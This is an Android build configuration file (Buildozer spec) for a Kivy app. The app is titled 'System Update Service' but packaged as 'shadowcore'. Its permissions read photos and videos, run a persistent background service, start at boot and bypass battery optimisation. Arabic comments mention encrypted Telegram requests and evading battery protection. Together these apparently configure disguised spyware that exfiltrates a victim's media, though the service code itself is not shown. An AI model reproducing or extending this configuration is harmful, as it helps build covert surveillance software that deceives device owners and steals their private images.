[app]
# (str) Title of your application
title = System Update Service

# (str) Package name
package.name = shadowcore

# (str) Package domain (needed for android packaging)
package.domain = org.test

# (str) Source code where the main.py lives
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning (method 1)
version = 1.80

# (list) Application requirements
# أضفنا certifi و idna لضمان عمل طلبات تليجرام المشفرة
requirements = python3,kivy,requests,urllib3,certifi,idna,chardet,jnius

# (str) Supported orientations
orientation = portrait

# (list) Permissions
# الأذونات المطلوبة للصور، الخدمة، وتجاوز حماية البطارية
android.permissions = INTERNET, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, FOREGROUND_SERVICE, WAKE_LOCK, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, RECEIVE_BOOT_COMPLETED, POST_NOTIFICATIONS

# (int) Target Android API, should be as high as possible.
android.api = 34

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = 25b

# (bool) Use --private data storage (True) or --dir public storage (False)
android.private_storage = True

# (list) Services to run in background
# هذا هو السطر السحري الذي يربط ملف service.py بالعملية
services = myservice:service.py

# (list) The Android archs to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.archs = arm64-v8a

# (bool) allows cookie to remain active
android.copy_libs = 1

# (list) List of Java files to add to the android project
# android.add_src = 

[buildozer]
# (int) log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) display warning if buildozer is run as root (0 = off, 1 = on)
warn_on_root = 1
